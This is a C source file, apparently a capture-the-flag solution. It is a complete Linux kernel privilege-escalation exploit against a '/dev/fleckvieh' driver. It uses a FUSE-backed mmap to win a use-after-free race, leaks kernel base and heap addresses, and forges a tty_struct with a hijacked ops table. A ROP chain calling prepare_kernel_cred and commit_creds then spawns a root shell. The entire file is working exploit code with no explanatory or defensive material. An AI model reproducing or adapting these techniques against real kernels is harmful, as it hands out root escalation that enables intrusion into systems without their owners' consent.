#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include "asm-generic/errno-base.h"  // for ENOENT
#include "fuse_opt.h"                // for FUSE_ARGS_INIT, fuse_args
#include <fcntl.h>                   // for open, O_RDWR, O_NOCTTY
#include <fuse.h>                    // for fuse_operations, fuse_unmount
#include <inttypes.h>                // for uintptr_t, PRIx64, uint32_t, uin...
#include <pthread.h>                 // for pthread_create, pthread_detach
#include <sched.h>                   // for sched_setaffinity, sched_yield
#include <stdbool.h>                 // for bool, false, true
#include <stdio.h>                   // for NULL, size_t, perror, printf, puts
#include <stdlib.h>                  // for calloc, EXIT_FAILURE, free, EXIT...
#include <string.h>                  // for memcpy, memset, strcmp
#include <sys/ioctl.h>               // for ioctl
#include <sys/mman.h>                // for mmap, munmap, MAP_PRIVATE, PROT_...
#include <sys/stat.h>                // for stat, mkdir, S_IFREG
#include <sys/types.h>               // for off_t
#include <unistd.h>                  // for close, execve, rmdir, sleep, sys...

/* Return frame for iretq */
uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
	int id;
	size_t size;
	char *data;
} request_t;

#define tty_struct_len 0x400
#define ROP_OFFSET 0x300
#define PTMX_COUNT 0x10

#define push_rdx_pop_rsp_pop_rbp_ret	0xffffffff8109b13a
#define pop_rdi_ret			0xffffffff811104a2
#define prepare_kernel_cred		0xffffffff810729d0
#define pop_rcx_pop_rbp_ret		0xffffffff810f5f83
#define mov_rdi_rax_rep_ret		0xffffffff81654bdb
#define commit_creds			0xffffffff81072830
#define kpti				0xffffffff81800e26

uintptr_t kheap;
uintptr_t offset;
#define OFFSET(addr) (addr + offset)

static volatile int ptmx[PTMX_COUNT] = { 0 };
static const char *fuse_patch = "/tmp/test";
static volatile bool fuse_done = false;
static struct fuse_chan *fchan = NULL;
static volatile int victim = -1;
static uintptr_t tty_struct_dev;
static char *mm = NULL;
static long page_size;
static char *payload;
static int dev = -1;

static void shell(void)
{
	puts("[+] get r00t!");
	fuse_unmount(fuse_patch, fchan);
	rmdir(fuse_patch);
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void cpu_pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static int dev_add(char *data, size_t len)
{
	request_t req = {
		.id = 0,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_ADD, &req);
}

static int dev_del(int id)
{
	request_t req = {
		.id = id,
		.size = 0,
		.data = NULL,
	};

	return ioctl(dev, CMD_DEL, &req);
}

static int dev_get(int id, char *data, size_t len)
{
	request_t req = {
		.id = id,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_GET, &req);
}

static int dev_set(int id, char *data, size_t len)
{
	request_t req = {
		.id = id,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_SET, &req);
}

static void fake_tty_struct(uintptr_t buf)
{
	uint32_t ops_offset = 0x100;

	uintptr_t *rop = (uintptr_t *)(buf + ROP_OFFSET);
	uintptr_t *tty = (uintptr_t *)buf;
	uintptr_t ops = buf + ops_offset;

	*tty++ = 0x0000000100005401;		/* magic */
	*tty++ = 0;
	*tty++ = tty_struct_dev;		/* dev */
	*tty++ = kheap + ops_offset;		/* ops */

	*(uintptr_t *)(ops + 0x00) = OFFSET(0xffffffff8133fe90);		/* ops->lookup */
	*(uintptr_t *)(ops + 0x08) = OFFSET(0xffffffff81340840);		/* ops->install */
	*(uintptr_t *)(ops + 0x10) = OFFSET(0xffffffff813402b0);		/* ops->remove */
	*(uintptr_t *)(ops + 0x18) = OFFSET(0xffffffff813404d0);		/* ops->open */
	*(uintptr_t *)(ops + 0x20) = OFFSET(0xffffffff813409e0);		/* ops->close */
	*(uintptr_t *)(ops + 0x30) = OFFSET(0xffffffff81340290);		/* ops->cleanup */
	*(uintptr_t *)(ops + 0x38) = OFFSET(0xffffffff81340200);		/* ops->write */
	*(uintptr_t *)(ops + 0x50) = OFFSET(0xffffffff81340470);		/* ops->write_room */
	*(uintptr_t *)(ops + 0x60) = OFFSET(push_rdx_pop_rsp_pop_rbp_ret);	/* ops->write_room */
	*(uintptr_t *)(ops + 0x80) = OFFSET(0xffffffff813404a0);		/* ops->unthrottle */
	*(uintptr_t *)(ops + 0x108) = OFFSET(0xffffffff8133fff0);		/* ops->flush_buffer */
	*(uintptr_t *)(ops + 0x138) = OFFSET(0xffffffff8133ff00);		/* ops->resize */
	*(uintptr_t *)(ops + 0x158) = OFFSET(0xffffffff81340350);		/* ops->show_fdinfo */
	
	*rop++ = 0;				/* pop rbp */
	*rop++ = OFFSET(pop_rdi_ret);
	*rop++ = (uintptr_t)NULL;
	*rop++ = OFFSET(prepare_kernel_cred);
	*rop++ = OFFSET(pop_rcx_pop_rbp_ret);
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = OFFSET(mov_rdi_rax_rep_ret);
	*rop++ = OFFSET(commit_creds);
	*rop++ = OFFSET(kpti);
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = (uintptr_t)shell;
	*rop++ = cs;
	*rop++ = rflags;
	*rop++ = rsp;
	*rop++ = ss;
}

static int getattr_callback(const char *path, struct stat *stbuf)
{
	memset(stbuf, 0, sizeof(struct stat));

	if (strcmp(path, "/pwn") == 0) {
		stbuf->st_mode = S_IFREG | 0777;
		stbuf->st_nlink = 1;
		stbuf->st_size = 0x1000;
		return 0;
	}

	return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
	(void)path;
	(void)fi;
	return 0;
}

static int read_callback(const char *path, char *buf, size_t size, off_t offset,
			 struct fuse_file_info *fi)
{
	(void)offset;
	(void)fi;
	static int count = 0;

	if (strcmp(path, "/pwn") == 0) {
		if (count == 2) {
			fake_tty_struct((uintptr_t)payload);
			for (int i = 0; i < 0x100; i++)
				dev_add(payload, tty_struct_len);
		}

		sched_yield();
		if (dev_del(victim)) {
			for (int i = 0; i < PTMX_COUNT; ++i)
				ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
			victim = -1;
		}

		if (count == 2)
			memcpy(buf, payload, size);
		count++;
		return size;
	}

	return -ENOENT;
}

void *fuse_hander(void *arg)
{
	(void)arg;
	struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
	struct fuse_operations ops;
	struct fuse *fuse;

	cpu_pin(0);
	memset(&ops, 0, sizeof(ops));
	ops.getattr = getattr_callback;
	ops.open = open_callback;
	ops.read = read_callback;

	mkdir(fuse_patch, 0777);
	fchan = fuse_mount(fuse_patch, &args);
	if (!fchan)
		goto err;

	fuse = fuse_new(fchan, &args, &ops, sizeof(ops), NULL);
	if (!fuse)
		goto err;

	fuse_set_signal_handlers(fuse_get_session(fuse));
	fuse_done = true;
	fuse_loop_mt(fuse);
	return NULL;

err:
	if (fchan)
		fuse_unmount(fuse_patch, fchan);
	return (void *)-1;
}

static int mmap_fuse(void)
{
	static int fd = -1;

	if (fd > 0) {
		close(fd);
		fd = -1;
	}

	if (mm) {
		munmap(mm, tty_struct_len);
		mm = NULL;
	}

	fd = open("/tmp/test/pwn", O_RDWR);
	if (fd < 0)
		return -1;

	mm = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	return 0;
}

static int uaf_ioctl(uint32_t cmd, char *data, uint64_t len)
{
	int ret = 0;
	char *zero = NULL;

	zero = calloc(tty_struct_len, 1);
	victim = dev_add(zero, tty_struct_len);
	if (victim < 0) {
		ret = -1;
		goto out;
	}

	switch (cmd) {
	case CMD_GET:
		ret = dev_get(victim, data, len);
		break;
	case CMD_SET:
		ret = dev_set(victim, data, len);
		break;
	default:
		ret = -1;
		goto out;
	}

	if (ret < 0) {
		ret = -1;
		goto out;
	}

	if (cmd == CMD_SET)
		return 0;

out:
	if (zero)
		free(zero);

	if (victim > 0) {
		dev_del(victim);
		victim = -1;
	}

	for (int i = 0; i < PTMX_COUNT; ++i) {
		if (ptmx[i] > 0) {
			close(ptmx[i]);
			ptmx[i] = 0;
		}
	}
	return ret;
}

static int leak_offset(char *data)
{
	if (uaf_ioctl(CMD_GET, data, 0x20) == -1)
		return -1;

	tty_struct_dev = *(uintptr_t *)&data[0x10];
	offset = *(uintptr_t *)&data[0x18] - 0xffffffff81c3c3c0;
	printf("[+] offset: %#" PRIx64 "\n", offset);
	return 0;
}

static int leak_kheap(char *data)
{
	if (uaf_ioctl(CMD_GET, data, tty_struct_len) == -1)
		return -1;

	kheap = *(uintptr_t *)&data[0x38] - 0x38;
	printf("[+] kheap: %#" PRIx64 "\n", kheap);
	return 0;
}

static int hijack_ops(char *data)
{
	if (uaf_ioctl(CMD_SET, data, tty_struct_len) == -1)
		return -1;

	return 0;
}

int main(void)
{
	pthread_t tid;
	int ret;

	cpu_pin(0);
	save_state();
	page_size = sysconf(_SC_PAGESIZE);

	dev = open("/dev/fleckvieh", O_RDWR);
	if (dev < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	ret = pthread_create(&tid, NULL, fuse_hander, NULL);
	if (ret != 0) {
		perror("[-] pthread_create");
		return EXIT_FAILURE;
	}

	pthread_detach(tid);
	while (!fuse_done)
		sleep(1);

	mmap_fuse();
	leak_offset(mm);

	mmap_fuse();
	leak_kheap(mm);

	payload = calloc(page_size, 1);
	memcpy(payload, mm, tty_struct_len);
	mmap_fuse();
	hijack_ops(mm);
	for (int i = 0; i < PTMX_COUNT; ++i)
		ioctl(ptmx[i], 0, kheap + ROP_OFFSET);

	return EXIT_SUCCESS;
}
